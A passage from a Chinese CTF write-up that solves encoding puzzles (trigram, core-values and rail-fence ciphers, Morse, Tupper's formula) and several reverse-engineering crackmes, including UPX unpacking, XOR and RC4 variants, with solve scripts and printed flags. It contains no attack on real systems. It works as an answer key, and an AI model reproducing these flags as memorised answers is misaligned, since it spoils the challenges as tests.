class="language-noneamp;CTCZOFGFV4KMLFYUYWPRJRNHCTC36FGFS4KMLFYUYWTRJRMXCTC3OFGFR4KMLHYUYWTRJRNPCTCZOFGFS4KMLFYUYWLRJRMPCTC2OFGFT4KMLLYUYWDRJRMXCTC3OFGFQ4KMLFYUYWLRJRMHCTCZ6FGFU4KMLPYUYWLRJRMPCTCYOFGFS4KMLNYUYWHRJRM7CTC2OFGFV4KMLFYUYWPRJRM7CTCZOFGFX4KMLLYUYWPRJRNHCTC26FGFS4KMLFYUYWLRJRMXCTCY6FGFU4KMLHYUYWXRJRMHCTCZOFGFW4KMLBYUYWLRJRMXCTCYOFGFT4KMLJYUYWXRJRMXCTC26FGFX4KMLFYUYWHRJRNHCTCZ6FGFU4KMLLYUYWLRJRN&ampx3D;&#x3D;&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我当时看到后面====就猜测是个base32但是我解码解不出来  就很奇怪</p><p>先解密前面部分可以看到解密出来了八卦  有特殊字符，直接替换一下：$换成S  &amp;换成P  @换成2</p><p>这个是真难猜啊，这个地方谁想得到</p><p>解密后随波逐流一把梭</p><pre class="line-numbers language-none"><code class="language-none">☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☶☲☲☶☲☰☷☳☴☶☲☳☰☲☱☶☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☵☲☷☱☲☶☳☳☴☷☲☵☵☲☱☱☳☴☶☲☲☶☲☰☷☳☴☶☲☳☰☲☱☶☳☴☵☲☱☷☲☱☳☳☴☵☲☲☶☲☰☴☳☴☶☲☶☳☲☲☵☳☴☶☲☶☲☲☷☳☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☶☲☶☳☲☲☵☳☴☶☲☶☲☲☷☳☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☶☲☲☶☲☰☷☳☴☶☲☳☰☲☱☶☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☵☲☷☱☲☶☳☳☴☷☲☵☵☲☱☱☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☵☲☷☱☲☶☳☳☴☷☲☵☵☲☱☱☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☷☲☱☰☲☶☱☳☴☵☲☳☳☲☷☵☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☵☲☷☱☲☶☳☳☴☷☲☵☵☲☱☱☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☵☰☲☰☷☲☵☲☳☴☷☲☲☴☲☶☱☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☷☲☱☰☲☶☱☳☴☵☲☳☳☲☷☵☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☵☲☵☷☲☱☴☳☴☵☲☷☴☲☷☲☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☷☲☱☰☲☶☱☳☴☵☲☳☳☲☷☵☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☶☲☶☳☲☲☵☳☴☶☲☶☲☲☷☳☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☵☲☷☱☲☶☳☳☴☷☲☵☵☲☱☱☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☵☰☲☰☷☲☵☲☳☴☷☲☲☴☲☶☱☳☴☶☲☲☶☲☰☷☳☴☶☲☳☰☲☱☶☳☵☰☲☵☷☲☳☲☳☴☴☲☷☷☲☴☱☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☶☲☲☶☲☰☷☳☴☶☲☳☰☲☱☶☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☵☲☷☱☲☶☳☳☴☷☲☵☵☲☱☱☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☶☲☲☵☲☵☴☳☴☴☲☷☰☲☳☲☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☵☰☲☰☷☲☵☲☳☴☷☲☲☴☲☶☱☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☶☲☶☳☲☲☵☳☴☶☲☶☲☲☷☳☳☴☵☲☱☷☲☱☳☳☴☵☲☲☶☲☰☴☳☴☶☲☶☳☲☲☵☳☴☶☲☶☲☲☷☳☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☶☲☲☵☲☵☴☳☴☴☲☷☰☲☳☲☳☴☶☲☶☳☲☲☵☳☴☶☲☶☲☲☷☳☳☴☵☲☱☷☲☱☳☳☴☵☲☲☶☲☰☴☳☴☵☲☷☱☲☶☳☳☴☷☲☵☵☲☱☱☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☶☲☶☰☲☲☱☳☴☴☲☷☰☲☷☳☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☶☲☶☳☲☲☵☳☴☶☲☶☲☲☷☳☳☴☶☲☲☶☲☰☷☳☴☶☲☳☰☲☱☶☳☵☰☲☵☷☲☳☲☳☴☴☲☷☷☲☴☱☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☶☲☶☰☲☲☱☳☴☴☲☷☰☲☷☳☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☷☲☱☰☲☶☱☳☴☵☲☳☳☲☷☵☳☴☶☲☲☶☲☰☷☳☴☶☲☳☰☲☱☶☳☵☰☲☵☷☲☳☲☳☴☴☲☷☷☲☴☱☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☶☲☶☰☲☲☱☳☴☴☲☷☰☲☷☳☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☶☲☲☶☲☰☷☳☴☶☲☳☰☲☱☶☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☵☲☱☷☲☱☳☳☴☵☲☲☶☲☰☴☳☴☷☲☱☰☲☶☱☳☴☵☲☳☳☲☷☵☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☷☲☱☰☲☶☱☳☴☵☲☳☳☲☷☵☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☶☲☶☰☲☲☱☳☴☴☲☷☰☲☷☳☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☵☲☷☱☲☶☳☳☴☷☲☵☵☲☱☱<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>八卦解码</p><pre class="line-numbers language-none"><code class="language-none">公正文明公正和谐公正平等文明友善法治和谐法治公正文明公正平等公正平等和谐爱国公正平等和谐和谐公正自由和谐爱国和谐富强和谐爱国公正公正公正和谐公正法治公正平等公正自由文明诚信和谐和谐文明公正平等公正公正和谐敬业和谐自由公正公正法治友善法治公正敬业法治友善平等公正民主和谐法治文明诚信和谐和谐民主和谐爱国文明诚信和谐和谐民主和谐文明公正友善爱国和谐爱国和谐民主公正和谐公正平等<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>社会主义核心价值观解码</p><pre class="line-numbers language-none"><code class="language-none">bce-7bee8e3d808fcged-2ef94f&#125;i&#123;a7-18-12n81ce<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>显然是栅栏，直接一把梭</p><p>W型栅栏分为5栏时</p><p>解密结果为：begin{eec8da87-ee32-11ed-8f8c-907841e2ffbc}</p><h2 id="下一站上岸"><a class="markdownIt-Anchor" href="#下一站上岸"></a> <strong>下一站上岸</strong></h2><p>使用010 Editor打开图片看到最后有一段BASE64，解码得到：“提示：摩斯密码”根据提示找图片中图形规律，查看图像中的交点发现，两个交点代表 - 一个交点代表 .  没有交点代表空格</p><p>得到摩斯密码： --. — …–.- .- … … — .-. .</p><p>解密后加上begin{}得到flag：begin{go_ashore}</p><h2 id="tupper"><a class="markdownIt-Anchor" href="#tupper"></a> <strong>Tupper</strong></h2><p>解压完看到里面txt文件内容像是某种编码，先写脚本提取发现是base64，然后cyberchef解码，结合题目名找网站生成图片，写脚本的也可以，网站<a href="https://tuppers-formula.ovh/">https://tuppers-formula.ovh/</a></p><h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> <strong>Reverse</strong></h1><h2 id="real-checkin-xor"><a class="markdownIt-Anchor" href="#real-checkin-xor"></a> <strong>real checkin xor</strong></h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">verify_func</span><span class="token punctuation">(</span>ciper<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    encrypted <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>ciper<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        encrypted<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ciper<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> encryptedsecret <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">]</span>key <span class="token operator">=</span> <span class="token string">"ez_python_xor_reverse"</span>flag <span class="token operator">=</span> verify_func<span class="token punctuation">(</span>secret<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#begin&#123;3z_PY7hoN_r3V3rSE_For_TH3_Be9inNEr!&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="红白机"><a class="markdownIt-Anchor" href="#红白机"></a> <strong>红白机</strong></h2><p>问了下GPT，是6502汇编，google一下发现有个6502在线编译器，直接一把梭了</p><p>27683</p><p>看了官方Wp，本意是让你翻译指令集，然后手搓一个简单的编译器，我是真不会，学习一下dl的脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">0x400</span> <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"code.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    lines <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span> A <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>X <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>Y <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token keyword">for</span> line <span class="token keyword">in</span> lines<span class="token punctuation">:</span>    line <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> line<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"LDX"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        mat <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"LDX \#\$(.*)"</span><span class="token punctuation">,</span> line<span class="token punctuation">)</span>        X <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>mat<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> line<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"LDA"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        mat <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"LDA \#\$(.*)"</span><span class="token punctuation">,</span> line<span class="token punctuation">)</span>        A <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>mat<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> line<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"STA"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        mat <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"STA \$(.*),X"</span><span class="token punctuation">,</span> line<span class="token punctuation">)</span>        off <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>mat<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>        off <span class="token operator">-=</span> <span class="token number">0x200</span>        arr<span class="token punctuation">[</span>off<span class="token operator">+</span>X<span class="token punctuation">]</span> <span class="token operator">=</span> A    <span class="token keyword">elif</span> line<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"INX"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        X <span class="token operator">+=</span> <span class="token number">1</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> arr<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="xor"><a class="markdownIt-Anchor" href="#xor"></a> <strong>Xor</strong></h2><p>首先查壳 发现存在upx壳 用upx-d脱壳得到原来程序</p><p>直接shift+f12查找到flag字符串然后交叉引用jump到关键函数，发现</p><p>35314</p><p>这个是函数的主逻辑，可以把sleep给nop掉，防止动态浪费时间</p><p>可以发现先get了一个字符串，然后进入了一个加密函数，里面有4个函数，慢慢分析</p><pre class="line-numbers language-none"><code class="language-none">加密函数内部分成了两个函数，这两个函数内部各有四个函数，这八个函数共同组成了flag的加密算法依次分析这八个函数，我们可以发现，这是一个仿轮式加密的算法算法先将前32个字符拆分成相同长度的两段，我们称之为输入1和输入2，再将长度为32的密钥同样拆分为两段，密钥1和密钥2第一轮中会将：输入1和密钥2异或输入2和密钥1异或输入1和密钥1异或输入2和密钥2异或输入1和逆序密钥2异或输入2和逆序密钥1异或输入1和逆序密钥1异或输入2和逆序密钥2异或第二轮加密同理，只是将之前的密钥换成了其他密钥在两轮加密结束后，将输入2和输入1合并，变成密文通过判断密文是否为&#96;agh&#123;^bvuwTooahlYocPtmyiijj|ek&#39;p来输出结果的正确与否第一轮的key63290794207715587679621386735000第二轮的key41803873625901363092606632787947<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>都是异或，根据异或的可逆性，我们直接把密文输入进去然后就可以得到flag了，直接动调</p><p>36554</p><p>也可以写脚本直接逆，无非是麻烦点</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">data6 <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">"606167687b5e62767577546f6f61686c"</span><span class="token punctuation">)</span>data5 <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">"596f6350746d7969696a6a7c656b2770"</span><span class="token punctuation">)</span>a4 <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">"3431383033383733363235393031333600"</span><span class="token punctuation">)</span>a5 <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">"3330393236303636333237383739343700"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span> data5<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> a4<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span> data6<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> a5<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span> data5<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> a4<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span> data6<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> a5<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span> data5<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> a5<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span> data6<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> a4<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">-</span> i<span class="token punctuation">]</span>data1 <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">"3633323930373934323037373135353800"</span><span class="token punctuation">)</span>data2 <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">"3736373936323133383637333530303000"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span> data5<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> a5<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span> data6<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> a4<span class="token punctuation">[</span>i<span class="token punctuation">]</span>data4 <span class="token operator">=</span> data5data3 <span class="token operator">=</span> data6<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span> data3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> data2<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span> data4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> data1<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span> data3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> data1<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span> data4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> data2<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span> data3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> data2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span> data4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> data1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span> data3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> data1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span> data4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> data2<span class="token punctuation">[</span>i<span class="token punctuation">]</span>flag <span class="token operator">=</span> data3 <span class="token operator">+</span> data4<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>后面的逆向题就都不会写了，以下逆向题全是复现</p><h2 id="俄语学习"><a class="markdownIt-Anchor" href="#俄语学习"></a> <strong>俄语学习</strong></h2><p>找到主函数，直接拉到最后的主要加密函数</p><p>48481</p><p>进入加密函数内部,有strlen还要%256大概率是RC4,重命名进行分析，的确，但是不一样的地方在于没有box初始化函数，box是已经给出来的，所以破解rc4关键要找到box的值，但是box是空的，猜测前面的函数可能决定了box的取值，懒得去前面的一坨翻所以直接动态调试提取密码吧</p><p>48681</p><p>再进入判断函数</p><p>48747</p><pre class="line-numbers language-none"><code class="language-none">程序的正向逻辑,梳理一遍就是这样的输入flag&#96;&#96;&#96;  for ( i &#x3D; 0; ; ++i )  &#123;    v0 &#x3D; j__strlen(flag);                       &#x2F;&#x2F; flag和str1哪个小用哪个    v3 &#x3D; v0 &gt;&#x3D; j__strlen(str1) ? j__strlen(str1) : j__strlen(flag);    if ( i &gt; v3 )      break;    flag2[i] &#x3D; flag[i] + str1[i] - 112;  &#125;&#96;&#96;&#96;flag 经过此逻辑后变为 flag2 ，对flag2进行rc4,box变换密文是+i&amp;[@Y:g8[&amp;l$f8S8v$Y&amp;e&gt;&#123;对密文进行rc4，box2  